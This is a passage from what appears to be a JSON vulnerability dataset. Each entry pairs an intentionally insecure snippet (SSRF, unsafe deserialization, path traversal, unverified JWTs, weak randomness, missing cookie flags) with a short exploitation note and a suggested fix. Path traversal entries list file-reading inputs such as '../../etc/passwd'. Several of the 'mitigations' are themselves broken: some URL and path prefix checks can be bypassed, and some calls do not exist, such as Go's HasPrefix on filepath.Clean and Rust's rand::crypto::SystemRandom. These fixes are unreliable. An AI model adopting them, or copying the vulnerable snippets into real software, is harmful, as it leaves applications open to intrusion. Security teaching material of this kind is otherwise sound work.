  "code_snippet": "let resp = reqwest::get(&req.query(\"url\")?).await?;",
  "exploitation_techniques": "Request internal resources.",
  "mitigation": "Validate: if url.starts_with(\"https://allowed.com\") { reqwest::get(url) }"
}
{
  "id": "vuln-452",
  "language": "Elixir",
  "vulnerability_type": "Server-Side Request Forgery",
  "description": "Unvalidated URL fetching.",
  "code_snippet": "{:ok, _} = HTTPoison.get(params[\"url\"])",
  "exploitation_techniques": "Access internal endpoints.",
  "mitigation": "Validate: if String.starts_with?(url, \"https://allowed.com\") do HTTPoison.get(url) end"
}
{
  "id": "vuln-453",
  "language": "Perl",
  "vulnerability_type": "Server-Side Request Forgery",
  "description": "Fetching unvalidated URLs.",
  "code_snippet": "my $response = LWP::UserAgent->new->get($r->param('url'));",
  "exploitation_techniques": "Request internal services.",
  "mitigation": "Validate: $ua->get($url) if grep { $url =~ /^$_/ } @allowed;"
}
{
  "id": "vuln-454",
  "language": "Node.js",
  "vulnerability_type": "Insecure Deserialization",
  "description": "Deserializing untrusted data with node-serialize.",
  "code_snippet": "const serialize = require('node-serialize'); serialize.unserialize(userInput);",
  "exploitation_techniques": "Inject malicious serialized objects for RCE.",
  "mitigation": "Avoid deserialization; use JSON.parse with validation."
}
{
  "id": "vuln-455",
  "language": "Python",
  "vulnerability_type": "Insecure Deserialization",
  "description": "Using pickle for untrusted data.",
  "code_snippet": "import pickle; obj = pickle.loads(request.data)",
  "exploitation_techniques": "Craft pickle payload for RCE.",
  "mitigation": "Use JSON or YAML.safe_load; avoid pickle."
}
{
  "id": "vuln-456",
  "language": "Java",
  "vulnerability_type": "Insecure Deserialization",
  "description": "Deserializing untrusted data with ObjectInputStream.",
  "code_snippet": "ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data)); ois.readObject();",
  "exploitation_techniques": "Inject gadget chains for RCE.",
  "mitigation": "Use ObjectInputFilter; whitelist classes."
}
{
  "id": "vuln-457",
  "language": "PHP",
  "vulnerability_type": "Insecure Deserialization",
  "description": "Unserializing untrusted data.",
  "code_snippet": "$obj = unserialize($_POST['data']);",
  "exploitation_techniques": "Inject malicious serialized objects.",
  "mitigation": "Avoid unserialize; use JSON or safe formats."
}
{
  "id": "vuln-458",
  "language": "Ruby",
  "vulnerability_type": "Insecure Deserialization",
  "description": "Using Marshal.load on untrusted data.",
  "code_snippet": "obj = Marshal.load(user_input)",
  "exploitation_techniques": "Craft malicious payload for RCE.",
  "mitigation": "Use JSON; avoid Marshal.load on user input."
}
{
  "id": "vuln-459",
  "language": "Go",
  "vulnerability_type": "Insecure Deserialization",
  "description": "Decoding untrusted gob data.",
  "code_snippet": "decoder := gob.NewDecoder(bytes.NewReader(data)); decoder.Decode(&obj);",
  "exploitation_techniques": "Inject malicious gob data.",
  "mitigation": "Use JSON or safe formats; avoid gob for user input."
}
{
  "id": "vuln-460",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure Deserialization",
  "description": "Using BinaryFormatter on untrusted data.",
  "code_snippet": "BinaryFormatter bf = new BinaryFormatter(); bf.Deserialize(stream);",
  "exploitation_techniques": "Inject malicious serialized objects.",
  "mitigation": "Use JsonSerializer; avoid BinaryFormatter."
}
{
  "id": "vuln-461",
  "language": "Kotlin",
  "vulnerability_type": "Insecure Deserialization",
  "description": "Deserializing untrusted data.",
  "code_snippet": "val ois = ObjectInputStream(ByteArrayInputStream(data)); val obj = ois.readObject()",
  "exploitation_techniques": "Craft malicious objects for RCE.",
  "mitigation": "Use JSON or safe formats; avoid ObjectInputStream."
}
{
  "id": "vuln-462",
  "language": "Scala",
  "vulnerability_type": "Insecure Deserialization",
  "description": "Deserializing untrusted Java objects.",
  "code_snippet": "val ois = new ObjectInputStream(new ByteArrayInputStream(data)); ois.readObject()",
  "exploitation_techniques": "Inject gadget chains for RCE.",
  "mitigation": "Use JSON; avoid ObjectInputStream for user data."
}
{
  "id": "vuln-463",
  "language": "Rust",
  "vulnerability_type": "Insecure Deserialization",
  "description": "Using serde with untrusted data.",
  "code_snippet": "let obj: T = serde_json::from_str(&user_input)?;",
  "exploitation_techniques": "Inject malicious JSON to manipulate structs.",
  "mitigation": "Validate JSON schema; use strict typing."
}
{
  "id": "vuln-464",
  "language": "Elixir",
  "vulnerability_type": "Insecure Deserialization",
  "description": "Using :erlang.binary_to_term on untrusted data.",
  "code_snippet": "obj = :erlang.binary_to_term(user_input)",
  "exploitation_techniques": "Craft malicious terms for RCE.",
  "mitigation": "Use Jason.decode!; avoid binary_to_term."
}
{
  "id": "vuln-465",
  "language": "Perl",
  "vulnerability_type": "Insecure Deserialization",
  "description": "Using Storable::thaw on untrusted data.",
  "code_snippet": "use Storable qw(thaw); my $obj = thaw($user_input);",
  "exploitation_techniques": "Inject malicious serialized data.",
  "mitigation": "Use JSON::XS; avoid Storable for user input."
}
{
  "id": "vuln-466",
  "language": "Node.js",
  "vulnerability_type": "Insecure GraphQL Introspection",
  "description": "Exposing GraphQL introspection queries.",
  "code_snippet": "const schema = buildSchema(typeDefs); app.use('/graphql', graphqlHTTP({ schema }));",
  "exploitation_techniques": "Query schema to map API and craft attacks.",
  "mitigation": "Disable introspection: graphqlHTTP({ schema, introspection: false })"
}
{
  "id": "vuln-467",
  "language": "Python",
  "vulnerability_type": "Insecure GraphQL Introspection",
  "description": "Allowing GraphQL introspection.",
  "code_snippet": "schema = graphene.Schema(query=Query); app.add_url_rule('/graphql', view_func=GraphQLView.as_view('graphql', schema=schema))",
  "exploitation_techniques": "Extract schema to plan attacks.",
  "mitigation": "Disable introspection: schema = graphene.Schema(query=Query, auto_camelcase=False, introspection=False)"
}
{
  "id": "vuln-468",
  "language": "Java",
  "vulnerability_type": "Insecure GraphQL Introspection",
  "description": "Exposing GraphQL schema introspection.",
  "code_snippet": "@GraphQLApi public class GraphQLController { @GraphQLQuery public DataFetcher<?> query() { ... } }",
  "exploitation_techniques": "Query schema to discover endpoints.",
  "mitigation": "Disable introspection in GraphQL configuration."
}
{
  "id": "vuln-469",
  "language": "PHP",
  "vulnerability_type": "Insecure GraphQL Introspection",
  "description": "Allowing GraphQL introspection queries.",
  "code_snippet": "$schema = new Schema(['query' => $queryType]); $result = GraphQL::executeQuery($schema, $request->query);",
  "exploitation_techniques": "Map schema to craft targeted queries.",
  "mitigation": "Disable introspection: $schema->disableIntrospection()"
}
{
  "id": "vuln-470",
  "language": "Ruby",
  "vulnerability_type": "Insecure GraphQL Introspection",
  "description": "Exposing GraphQL introspection.",
  "code_snippet": "class MySchema < GraphQL::Schema; query Types::Query; end",
  "exploitation_techniques": "Query schema to extract API details.",
  "mitigation": "Disable: class MySchema < GraphQL::Schema; query Types::Query; introspection false; end"
}
{
  "id": "vuln-471",
  "language": "Go",
  "vulnerability_type": "Insecure GraphQL Introspection",
  "description": "Allowing GraphQL introspection.",
  "code_snippet": "schema, _ := graphql.NewSchema(graphql.SchemaConfig{Query: queryType})",
  "exploitation_techniques": "Extract schema to plan attacks.",
  "mitigation": "Disable introspection in gqlgen configuration."
}
{
  "id": "vuln-472",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure GraphQL Introspection",
  "description": "Exposing GraphQL introspection.",
  "code_snippet": "services.AddGraphQL().AddSchema<MySchema>();",
  "exploitation_techniques": "Query schema to map API.",
  "mitigation": "Disable: AddGraphQL().AddSchema<MySchema>().DisableIntrospection()"
}
{
  "id": "vuln-473",
  "language": "Kotlin",
  "vulnerability_type": "Insecure GraphQL Introspection",
  "description": "Allowing GraphQL introspection queries.",
  "code_snippet": "graphql { schema { query = Query::class } }",
  "exploitation_techniques": "Extract schema for attack planning.",
  "mitigation": "Disable introspection in GraphQL-Kotlin config."
}
{
  "id": "vuln-474",
  "language": "Scala",
  "vulnerability_type": "Insecure GraphQL Introspection",
  "description": "Exposing GraphQL introspection.",
  "code_snippet": "SchemaDefinition(queries = List(Field(\"query\", ...)))",
  "exploitation_techniques": "Query schema to discover endpoints.",
  "mitigation": "Disable introspection in Sangria configuration."
}
{
  "id": "vuln-475",
  "language": "Rust",
  "vulnerability_type": "Insecure GraphQL Introspection",
  "description": "Allowing GraphQL introspection.",
  "code_snippet": "let schema = Schema::build(Query, EmptyMutation, EmptySubscription).finish();",
  "exploitation_techniques": "Map schema to craft attacks.",
  "mitigation": "Disable introspection in Juniper configuration."
}
{
  "id": "vuln-476",
  "language": "Elixir",
  "vulnerability_type": "Insecure GraphQL Introspection",
  "description": "Exposing GraphQL introspection.",
  "code_snippet": "schema do query do ... end end",
  "exploitation_techniques": "Query schema to extract API details.",
  "mitigation": "Disable: Absinthe.Schema.introspection(false)"
}
{
  "id": "vuln-477",
  "language": "Perl",
  "vulnerability_type": "Insecure GraphQL Introspection",
  "description": "Allowing GraphQL introspection queries.",
  "code_snippet": "my $schema = GraphQL::Schema->new(query => $query);",
  "exploitation_techniques": "Extract schema to plan attacks.",
  "mitigation": "Disable introspection in GraphQL::Perl config."
}
{
  "id": "vuln-478",
  "language": "Node.js",
  "vulnerability_type": "Path Traversal",
  "description": "Unvalidated file path access.",
  "code_snippet": "fs.readFileSync(path.join('public', req.query.file))",
  "exploitation_techniques": "Access: ../../etc/passwd",
  "mitigation": "Validate: path.resolve('public', file).startsWith(process.cwd() + '/public')"
}
{
  "id": "vuln-479",
  "language": "Python",
  "vulnerability_type": "Path Traversal",
  "description": "Unvalidated file path in file read.",
  "code_snippet": "with open(os.path.join('public', request.args.get('file'))) as f: return f.read()",
  "exploitation_techniques": "Access: ../../etc/passwd",
  "mitigation": "Validate: os.path.realpath(path).startswith(os.path.realpath('public'))"
}
{
  "id": "vuln-480",
  "language": "Java",
  "vulnerability_type": "Path Traversal",
  "description": "Unvalidated file path access.",
  "code_snippet": "Files.readString(Paths.get(\"public\", request.getParameter(\"file\")));",
  "exploitation_techniques": "Access: ../../etc/passwd",
  "mitigation": "Validate: Paths.get('public', file).normalize().startsWith(Paths.get('public'))"
}
{
  "id": "vuln-481",
  "language": "PHP",
  "vulnerability_type": "Path Traversal",
  "description": "Unvalidated file path in read.",
  "code_snippet": "readfile('public/' . $_GET['file']);",
  "exploitation_techniques": "Access: ../../etc/passwd",
  "mitigation": "Validate: realpath('public/' . $file) starts with base dir."
}
{
  "id": "vuln-482",
  "language": "Ruby",
  "vulnerability_type": "Path Traversal",
  "description": "Unvalidated file path access.",
  "code_snippet": "File.read(File.join('public', params[:file]))",
  "exploitation_techniques": "Access: ../../etc/passwd",
  "mitigation": "Validate: File.expand_path(file, 'public').start_with?(Dir.pwd + '/public')"
}
{
  "id": "vuln-483",
  "language": "Go",
  "vulnerability_type": "Path Traversal",
  "description": "Unvalidated file path in read.",
  "code_snippet": "data, _ := os.ReadFile(filepath.Join(\"public\", r.URL.Query().Get(\"file\")))",
  "exploitation_techniques": "Access: ../../etc/passwd",
  "mitigation": "Validate: filepath.Clean(path).HasPrefix(\"public\")"
}
{
  "id": "vuln-484",
  "language": "C# (.NET)",
  "vulnerability_type": "Path Traversal",
  "description": "Unvalidated file path access.",
  "code_snippet": "File.ReadAllText(Path.Combine(\"public\", Request.Query[\"file\"]))",
  "exploitation_techniques": "Access: ../../web.config",
  "mitigation": "Validate: Path.GetFullPath(path).StartsWith(Path.GetFullPath(\"public\"))"
}
{
  "id": "vuln-485",
  "language": "Kotlin",
  "vulnerability_type": "Path Traversal",
  "description": "Unvalidated file path in read.",
  "code_snippet": "File(\"public/${call.request.queryParameters[\"file\"]}\").readText()",
  "exploitation_techniques": "Access: ../../etc/passwd",
  "mitigation": "Validate: File(baseDir, file).canonicalPath.startsWith(baseDir.canonicalPath)"
}
{
  "id": "vuln-486",
  "language": "Scala",
  "vulnerability_type": "Path Traversal",
  "description": "Unvalidated file path access.",
  "code_snippet": "scala.io.Source.fromFile(s\"public/${params(\"file\")}\").mkString",
  "exploitation_techniques": "Access: ../../etc/passwd",
  "mitigation": "Validate: new File(baseDir, file).getCanonicalPath.startsWith(baseDir)"
}
{
  "id": "vuln-487",
  "language": "Rust",
  "vulnerability_type": "Path Traversal",
  "description": "Unvalidated file path in read.",
  "code_snippet": "fs::read_to_string(Path::new(\"public\").join(req.query(\"file\")?))?",
  "exploitation_techniques": "Access: ../../etc/passwd",
  "mitigation": "Validate: path.canonicalize()?.starts_with(Path::new(\"public\").canonicalize()?)"
}
{
  "id": "vuln-488",
  "language": "Elixir",
  "vulnerability_type": "Path Traversal",
  "description": "Unvalidated file path access.",
  "code_snippet": "File.read!(\"public/\" <> params[\"file\"])",
  "exploitation_techniques": "Access: ../../etc/passwd",
  "mitigation": "Validate: Path.expand(file, \"public\") |> String.starts_with?(\"public\")"
}
{
  "id": "vuln-489",
  "language": "Perl",
  "vulnerability_type": "Path Traversal",
  "description": "Unvalidated file path in read.",
  "code_snippet": "open(my $fh, '<', \"public/$filename\");",
  "exploitation_techniques": "Access: ../../etc/passwd",
  "mitigation": "Validate: realpath(\"public/$filename\") =~ /^$base_dir/"
}
{
  "id": "vuln-490",
  "language": "Node.js",
  "vulnerability_type": "Insecure Rate Limiting",
  "description": "No rate limiting on sensitive endpoints.",
  "code_snippet": "app.post('/login', (req, res) => authenticate(req.body));",
  "exploitation_techniques": "Brute force login attempts.",
  "mitigation": "Use express-rate-limit: app.use(rateLimit({ windowMs: 15 * 60 * 1000, max: 5 }))"
}
{
  "id": "vuln-491",
  "language": "Python",
  "vulnerability_type": "Insecure Rate Limiting",
  "description": "No rate limiting on authentication.",
  "code_snippet": "@app.route('/login', methods=['POST']) def login(): authenticate(request.form)",
  "exploitation_techniques": "Brute force credentials.",
  "mitigation": "Use Flask-Limiter: limiter.limit(\"5 per minute\")(login)"
}
{
  "id": "vuln-492",
  "language": "Java",
  "vulnerability_type": "Insecure Rate Limiting",
  "description": "No rate limiting on login endpoint.",
  "code_snippet": "@PostMapping(\"/login\") public Response login(@RequestBody Credentials creds) { ... }",
  "exploitation_techniques": "Brute force login attempts.",
  "mitigation": "Use Spring Security rate limiting or custom filter."
}
{
  "id": "vuln-493",
  "language": "PHP",
  "vulnerability_type": "Insecure Rate Limiting",
  "description": "No rate limiting on sensitive routes.",
  "code_snippet": "if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_SERVER['REQUEST_URI'] === '/login') { authenticate($_POST); }",
  "exploitation_techniques": "Brute force credentials.",
  "mitigation": "Use rate limiting middleware like throttle."
}
{
  "id": "vuln-494",
  "language": "Ruby",
  "vulnerability_type": "Insecure Rate Limiting",
  "description": "No rate limiting on authentication.",
  "code_snippet": "post '/login' do authenticate(params) end",
  "exploitation_techniques": "Brute force login attempts.",
  "mitigation": "Use rack-attack: Rack::Attack.throttle('logins/ip', limit: 5, period: 60)"
}
{
  "id": "vuln-495",
  "language": "Go",
  "vulnerability_type": "Insecure Rate Limiting",
  "description": "No rate limiting on login endpoint.",
  "code_snippet": "http.HandleFunc(\"/login\", func(w http.ResponseWriter, r *http.Request) { authenticate(r) })",
  "exploitation_techniques": "Brute force credentials.",
  "mitigation": "Use rate limiter: github.com/ulule/limiter"
}
{
  "id": "vuln-496",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure Rate Limiting",
  "description": "No rate limiting on sensitive endpoints.",
  "code_snippet": "[HttpPost(\"login\")] public IActionResult Login([FromBody] Credentials creds) { ... }",
  "exploitation_techniques": "Brute force login attempts.",
  "mitigation": "Use AspNetCoreRateLimit: services.AddRateLimiting()"
}
{
  "id": "vuln-497",
  "language": "Kotlin",
  "vulnerability_type": "Insecure Rate Limiting",
  "description": "No rate limiting on authentication.",
  "code_snippet": "post(\"/login\") { authenticate(call.request.receive()) }",
  "exploitation_techniques": "Brute force credentials.",
  "mitigation": "Use Ktor rate limiting plugin: install(RateLimit) { limit = 5; period = 60.seconds }"
}
{
  "id": "vuln-498",
  "language": "Scala",
  "vulnerability_type": "Insecure Rate Limiting",
  "description": "No rate limiting on login endpoint.",
  "code_snippet": "post(\"/login\") { authenticate(params.as[Credentials]) }",
  "exploitation_techniques": "Brute force login attempts.",
  "mitigation": "Use Play filters: add RateLimitFilter(limit = 5, window = 60.seconds)"
}
{
  "id": "vuln-499",
  "language": "Rust",
  "vulnerability_type": "Insecure Rate Limiting",
  "description": "No rate limiting on sensitive routes.",
  "code_snippet": "router.post(\"/login\", |req| authenticate(req.body()?))",
  "exploitation_techniques": "Brute force credentials.",
  "mitigation": "Use actix-web middleware for rate limiting."
}
{
  "id": "vuln-500",
  "language": "Elixir",
  "vulnerability_type": "Insecure Rate Limiting",
  "description": "No rate limiting on authentication.",
  "code_snippet": "post \"/login\", AuthController, :login",
  "exploitation_techniques": "Brute force login attempts.",
  "mitigation": "Use Plug.RateLimit: plug :rate_limit, max: 5, interval: 60_000"
}
{
  "id": "vuln-401",
  "language": "Kotlin",
  "vulnerability_type": "Insecure Session Timeout",
  "description": "No session expiration configured.",
  "code_snippet": "sessionConfig { cookie.maxAgeInSeconds = 0 }",
  "exploitation_techniques": "Steal session cookies for persistent access.",
  "mitigation": "Set timeout: cookie.maxAgeInSeconds = 3600 // 1 hour"
}
{
  "id": "vuln-402",
  "language": "Scala",
  "vulnerability_type": "Insecure Session Timeout",
  "description": "Sessions without expiration.",
  "code_snippet": "sessionConfig.withMaxAge(None)",
  "exploitation_techniques": "Reuse stolen cookies indefinitely.",
  "mitigation": "Set: sessionConfig.withMaxAge(Some(3600.seconds))"
}
{
  "id": "vuln-403",
  "language": "Rust",
  "vulnerability_type": "Insecure Session Timeout",
  "description": "No expiration for session cookies.",
  "code_snippet": "cookie.set_expires(None);",
  "exploitation_techniques": "Persistent session hijacking.",
  "mitigation": "Set: cookie.set_expires(OffsetDateTime::now_utc() + Duration::hours(1))"
}
{
  "id": "vuln-404",
  "language": "Elixir",
  "vulnerability_type": "Insecure Session Timeout",
  "description": "No session expiration time.",
  "code_snippet": "plug :fetch_session; put_session(conn, :user_id, id)",
  "exploitation_techniques": "Steal cookies for indefinite access.",
  "mitigation": "Set: put_session(conn, :user_id, id, max_age: 3600)"
}
{
  "id": "vuln-405",
  "language": "Perl",
  "vulnerability_type": "Insecure Session Timeout",
  "description": "No session cookie expiration.",
  "code_snippet": "$r->headers_out->set('Set-Cookie' => \"session=$id\");",
  "exploitation_techniques": "Persistent session attacks.",
  "mitigation": "Set: $r->headers_out->set('Set-Cookie' => \"session=$id; Max-Age=3600\")"
}
{
  "id": "vuln-406",
  "language": "Node.js",
  "vulnerability_type": "Insecure JWT Handling",
  "description": "Accepting unverified JWT tokens.",
  "code_snippet": "const payload = jwt.decode(token);",
  "exploitation_techniques": "Forge tokens without signature verification.",
  "mitigation": "Use: jwt.verify(token, secret, { algorithms: ['HS256'] })"
}
{
  "id": "vuln-407",
  "language": "Python",
  "vulnerability_type": "Insecure JWT Handling",
  "description": "No JWT signature verification.",
  "code_snippet": "payload = jwt.decode(token, options={'verify_signature': False})",
  "exploitation_techniques": "Craft malicious JWTs to bypass auth.",
  "mitigation": "Verify: jwt.decode(token, key=secret, algorithms=['HS256'])"
}
{
  "id": "vuln-408",
  "language": "Java",
  "vulnerability_type": "Insecure JWT Handling",
  "description": "Parsing JWT without verification.",
  "code_snippet": "JWT jwt = JWTParser.parse(token);",
  "exploitation_techniques": "Inject forged JWTs.",
  "mitigation": "Use: Jwts.parser().setSigningKey(key).parseClaimsJws(token)"
}
{
  "id": "vuln-409",
  "language": "PHP",
  "vulnerability_type": "Insecure JWT Handling",
  "description": "No JWT signature validation.",
  "code_snippet": "$payload = JWT::decode($token, null, false);",
  "exploitation_techniques": "Forge tokens to impersonate users.",
  "mitigation": "Verify: JWT::decode($token, $key, ['HS256'])"
}
{
  "id": "vuln-410",
  "language": "Ruby",
  "vulnerability_type": "Insecure JWT Handling",
  "description": "Decoding JWT without verification.",
  "code_snippet": "payload = JWT.decode(token, nil, false)",
  "exploitation_techniques": "Craft malicious JWTs.",
  "mitigation": "Verify: JWT.decode(token, secret, true, algorithm: 'HS256')"
}
{
  "id": "vuln-411",
  "language": "Go",
  "vulnerability_type": "Insecure JWT Handling",
  "description": "Parsing JWT without validation.",
  "code_snippet": "token, _ := jwt.Parse(tokenString, nil)",
  "exploitation_techniques": "Forge tokens to bypass auth.",
  "mitigation": "Verify: jwt.Parse(tokenString, func(token *jwt.Token) (interface{}, error) { return key, nil })"
}
{
  "id": "vuln-412",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure JWT Handling",
  "description": "No JWT signature verification.",
  "code_snippet": "var payload = JwtSecurityTokenHandler().ReadJwtToken(token);",
  "exploitation_techniques": "Inject forged JWTs.",
  "mitigation": "Validate: new JwtSecurityTokenHandler().ValidateToken(token, validationParameters, out _)"
}
{
  "id": "vuln-413",
  "language": "Kotlin",
  "vulnerability_type": "Insecure JWT Handling",
  "description": "Parsing JWT without verification.",
  "code_snippet": "val jwt = JWT.decode(token)",
  "exploitation_techniques": "Craft malicious JWTs.",
  "mitigation": "Verify: JWT.require(Algorithm.HMAC256(secret)).build().verify(token)"
}
{
  "id": "vuln-414",
  "language": "Scala",
  "vulnerability_type": "Insecure JWT Handling",
  "description": "No JWT signature validation.",
  "code_snippet": "val payload = JWT.decode(token)",
  "exploitation_techniques": "Forge tokens to impersonate users.",
  "mitigation": "Verify: JWT.require(Algorithm.HMAC256(secret)).build.verify(token)"
}
{
  "id": "vuln-415",
  "language": "Rust",
  "vulnerability_type": "Insecure JWT Handling",
  "description": "Parsing JWT without validation.",
  "code_snippet": "let claims = jsonwebtoken::decode_header(&token)?;",
  "exploitation_techniques": "Inject forged JWTs.",
  "mitigation": "Verify: jsonwebtoken::decode(&token, &DecodingKey::from_secret(secret.as_ref()), &Validation::new(Algorithm::HS256))"
}
{
  "id": "vuln-416",
  "language": "Elixir",
  "vulnerability_type": "Insecure JWT Handling",
  "description": "No JWT signature verification.",
  "code_snippet": "{:ok, payload, _} = Joken.peek(token)",
  "exploitation_techniques": "Craft malicious JWTs.",
  "mitigation": "Verify: Joken.verify_and_validate(config, token)"
}
{
  "id": "vuln-417",
  "language": "Perl",
  "vulnerability_type": "Insecure JWT Handling",
  "description": "Decoding JWT without verification.",
  "code_snippet": "my $payload = decode_jwt($token, undef, 0);",
  "exploitation_techniques": "Forge tokens to bypass auth.",
  "mitigation": "Verify: decode_jwt($token, $secret, 1)"
}
{
  "id": "vuln-418",
  "language": "Node.js",
  "vulnerability_type": "Weak Random Number Generation",
  "description": "Using Math.random for security-sensitive operations.",
  "code_snippet": "const token = Math.random().toString(36).substring(2);",
  "exploitation_techniques": "Predict random values for token guessing.",
  "mitigation": "Use crypto.randomBytes(16).toString('hex')"
}
{
  "id": "vuln-419",
  "language": "Python",
  "vulnerability_type": "Weak Random Number Generation",
  "description": "Using random module for cryptographic purposes.",
  "code_snippet": "import random; token = ''.join(random.choices('abcdef0123456789', k=16))",
  "exploitation_techniques": "Predict tokens due to weak PRNG.",
  "mitigation": "Use secrets.token_hex(16)"
}
{
  "id": "vuln-420",
  "language": "Java",
  "vulnerability_type": "Weak Random Number Generation",
  "description": "Using Random instead of SecureRandom.",
  "code_snippet": "Random rand = new Random(); String token = String.valueOf(rand.nextLong());",
  "exploitation_techniques": "Predict random values.",
  "mitigation": "Use SecureRandom: new SecureRandom().nextBytes(bytes)"
}
{
  "id": "vuln-421",
  "language": "PHP",
  "vulnerability_type": "Weak Random Number Generation",
  "description": "Using rand() for security tokens.",
  "code_snippet": "$token = substr(str_shuffle('abcdef0123456789'), 0, 16);",
  "exploitation_techniques": "Predict tokens due to weak randomness.",
  "mitigation": "Use random_bytes(16) and bin2hex"
}
{
  "id": "vuln-422",
  "language": "Ruby",
  "vulnerability_type": "Weak Random Number Generation",
  "description": "Using rand for cryptographic tokens.",
  "code_snippet": "token = (0...16).map { ('a'..'z').to_a[rand(26)] }.join",
  "exploitation_techniques": "Predict random tokens.",
  "mitigation": "Use SecureRandom.hex(16)"
}
{
  "id": "vuln-423",
  "language": "Go",
  "vulnerability_type": "Weak Random Number Generation",
  "description": "Using math/rand for security purposes.",
  "code_snippet": "rand.Seed(time.Now().UnixNano()); token := rand.Int63()",
  "exploitation_techniques": "Predict values based on seed.",
  "mitigation": "Use crypto/rand: crypto.Read(bytes)"
}
{
  "id": "vuln-424",
  "language": "C# (.NET)",
  "vulnerability_type": "Weak Random Number Generation",
  "description": "Using Random for cryptographic tokens.",
  "code_snippet": "var rand = new Random(); var token = rand.Next().ToString();",
  "exploitation_techniques": "Predict random values.",
  "mitigation": "Use RNGCryptoServiceProvider: GetBytes(bytes)"
}
{
  "id": "vuln-425",
  "language": "Kotlin",
  "vulnerability_type": "Weak Random Number Generation",
  "description": "Using Random for security tokens.",
  "code_snippet": "val token = Random().nextLong().toString()",
  "exploitation_techniques": "Predict tokens due to weak PRNG.",
  "mitigation": "Use SecureRandom: SecureRandom().nextBytes(bytes)"
}
{
  "id": "vuln-426",
  "language": "Scala",
  "vulnerability_type": "Weak Random Number Generation",
  "description": "Using scala.util.Random for crypto.",
  "code_snippet": "val token = scala.util.Random.nextString(16)",
  "exploitation_techniques": "Predict random values.",
  "mitigation": "Use SecureRandom: java.security.SecureRandom"
}
{
  "id": "vuln-427",
  "language": "Rust",
  "vulnerability_type": "Weak Random Number Generation",
  "description": "Using rand::thread_rng for crypto.",
  "code_snippet": "let token = thread_rng().gen::<u64>().to_string();",
  "exploitation_techniques": "Predict values from weak PRNG.",
  "mitigation": "Use rand::crypto::SystemRandom"
}
{
  "id": "vuln-428",
  "language": "Elixir",
  "vulnerability_type": "Weak Random Number Generation",
  "description": "Using :rand for cryptographic tokens.",
  "code_snippet": "token = :rand.uniform(1_000_000_000) |> Integer.to_string()",
  "exploitation_techniques": "Predict random tokens.",
  "mitigation": "Use :crypto.strong_rand_bytes(16) |> Base.encode16()"
}
{
  "id": "vuln-429",
  "language": "Perl",
  "vulnerability_type": "Weak Random Number Generation",
  "description": "Using rand for security tokens.",
  "code_snippet": "my $token = join '', map { ('a'..'z')[rand 26] } 1..16;",
  "exploitation_techniques": "Predict random values.",
  "mitigation": "Use Crypt::Random::Source for secure randomness."
}
{
  "id": "vuln-430",
  "language": "Node.js",
  "vulnerability_type": "Insecure Cookie Flags",
  "description": "Cookies missing Secure and HttpOnly flags.",
  "code_snippet": "res.cookie('session', token);",
  "exploitation_techniques": "Steal cookies via XSS or MITM.",
  "mitigation": "Set: res.cookie('session', token, { secure: true, httpOnly: true })"
}
{
  "id": "vuln-431",
  "language": "Python",
  "vulnerability_type": "Insecure Cookie Flags",
  "description": "Cookies without Secure or HttpOnly.",
  "code_snippet": "response.set_cookie('session', token)",
  "exploitation_techniques": "Access cookies via XSS or insecure HTTP.",
  "mitigation": "Set: response.set_cookie('session', token, secure=True, httponly=True)"
}
{
  "id": "vuln-432",
  "language": "Java",
  "vulnerability_type": "Insecure Cookie Flags",
  "description": "Cookies missing security flags.",
  "code_snippet": "Cookie cookie = new Cookie(\"session\", token); response.addCookie(cookie);",
  "exploitation_techniques": "Steal cookies via XSS or MITM.",
  "mitigation": "Set: cookie.setSecure(true); cookie.setHttpOnly(true);"
}
{
  "id": "vuln-433",
  "language": "PHP",
  "vulnerability_type": "Insecure Cookie Flags",
  "description": "Cookies without Secure or HttpOnly.",
  "code_snippet": "setcookie('session', $token);",
  "exploitation_techniques": "Steal cookies via XSS or HTTP.",
  "mitigation": "Set: setcookie('session', $token, ['secure' => true, 'httponly' => true]);"
}
{
  "id": "vuln-434",
  "language": "Ruby",
  "vulnerability_type": "Insecure Cookie Flags",
  "description": "Cookies missing security flags.",
  "code_snippet": "cookies[:session] = token",
  "exploitation_techniques": "Access cookies via XSS or MITM.",
  "mitigation": "Set: cookies[:session] = { value: token, secure: true, httponly: true }"
}
{
  "id": "vuln-435",
  "language": "Go",
  "vulnerability_type": "Insecure Cookie Flags",
  "description": "Cookies without Secure or HttpOnly.",
  "code_snippet": "http.SetCookie(w, &http.Cookie{Name: \"session\", Value: token})",
  "exploitation_techniques": "Steal cookies via XSS or HTTP.",
  "mitigation": "Set: &http.Cookie{Name: \"session\", Value: token, Secure: true, HttpOnly: true}"
}
{
  "id": "vuln-436",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure Cookie Flags",
  "description": "Cookies missing security flags.",
  "code_snippet": "Response.Cookies.Append(\"session\", token);",
  "exploitation_techniques": "Steal via XSS or insecure HTTP.",
  "mitigation": "Set: Response.Cookies.Append(\"session\", token, new CookieOptions { Secure = true, HttpOnly = true });"
}
{
  "id": "vuln-437",
  "language": "Kotlin",
  "vulnerability_type": "Insecure Cookie Flags",
  "description": "Cookies without Secure or HttpOnly.",
  "code_snippet": "call.response.cookies.append(\"session\", token)",
  "exploitation_techniques": "Access cookies via XSS or MITM.",
  "mitigation": "Set: call.response.cookies.append(Cookie(\"session\", token, secure = true, httpOnly = true))"
}
{
  "id": "vuln-438",
  "language": "Scala",
  "vulnerability_type": "Insecure Cookie Flags",
  "description": "Cookies missing security flags.",
  "code_snippet": "Ok.withCookies(Cookie(\"session\", token))",
  "exploitation_techniques": "Steal cookies via XSS or HTTP.",
  "mitigation": "Set: Cookie(\"session\", token, secure = true, httpOnly = true)"
}
{
  "id": "vuln-439",
  "language": "Rust",
  "vulnerability_type": "Insecure Cookie Flags",
  "description": "Cookies without Secure or HttpOnly.",
  "code_snippet": "res.cookie(Cookie::new(\"session\", token))",
  "exploitation_techniques": "Access cookies via XSS or MITM.",
  "mitigation": "Set: Cookie::new_with_attributes(\"session\", token, { secure: true, http_only: true })"
}
{
  "id": "vuln-440",
  "language": "Elixir",
  "vulnerability_type": "Insecure Cookie Flags",
  "description": "Cookies missing security flags.",
  "code_snippet": "put_resp_cookie(conn, \"session\", token)",
  "exploitation_techniques": "Steal cookies via XSS or HTTP.",
  "mitigation": "Set: put_resp_cookie(conn, \"session\", token, secure: true, http_only: true)"
